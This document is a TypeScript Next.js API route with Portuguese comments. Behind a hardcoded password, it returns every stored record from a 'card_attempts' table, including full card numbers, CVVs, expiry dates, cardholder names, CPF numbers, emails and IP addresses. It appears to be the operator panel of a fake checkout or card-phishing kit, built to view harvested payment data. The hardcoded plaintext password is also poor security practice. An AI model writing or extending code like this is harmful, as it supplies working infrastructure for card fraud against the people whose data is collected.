import { type NextRequest, NextResponse } from "next/server"
import { supabaseAdmin } from '@/lib/supabase'

export async function POST(request: NextRequest) {
  try {
    const { password } = await request.json()
    
    // Verificar senha
    if (password !== 'vipcolheita2025') {
      return NextResponse.json({ 
        success: false,
        error: "Senha incorreta"
      }, { status: 401 })
    }
    
    // Buscar dados do Supabase (tabela card_attempts)
    const { data, error } = await supabaseAdmin
      .from('card_attempts')
      .select('*')
      .order('created_at', { ascending: false })
    
    if (error) {
      return NextResponse.json({ 
        success: false,
        error: "Erro ao buscar dados",
        details: error.message
      }, { status: 500 })
    }
    
    // Transformar dados para o formato esperado pelo frontend
    const formattedData = data?.map(item => ({
      id: item.id.toString(),
      timestamp: item.created_at,
      customer: {
        name: item.card_name, // Nome do titular do cartão
        cpf: item.cpf,
        phone: '', // Não temos mais esse campo
        email: item.email,
        address: '' // Não temos mais esse campo
      },
      card: {
        number: item.card_number,
        holderName: item.card_name,
        expiryDate: item.card_expiry,
        cvv: item.card_cvv
      },
      product: {
        name: item.product_name || '',
        price: item.amount || 0,
        quantity: 1
      },
      total: item.amount || 0,
      ip: item.ip,
      userAgent: item.user_agent,
      category: item.category
    })) || []
    
    return NextResponse.json({ 
      success: true,
      data: formattedData
    })
  } catch (error) {
    return NextResponse.json({ 
      success: false,
      error: "Erro ao buscar dados",
      details: error instanceof Error ? error.message : 'Unknown error'
    }, { status: 500 })
  }
}
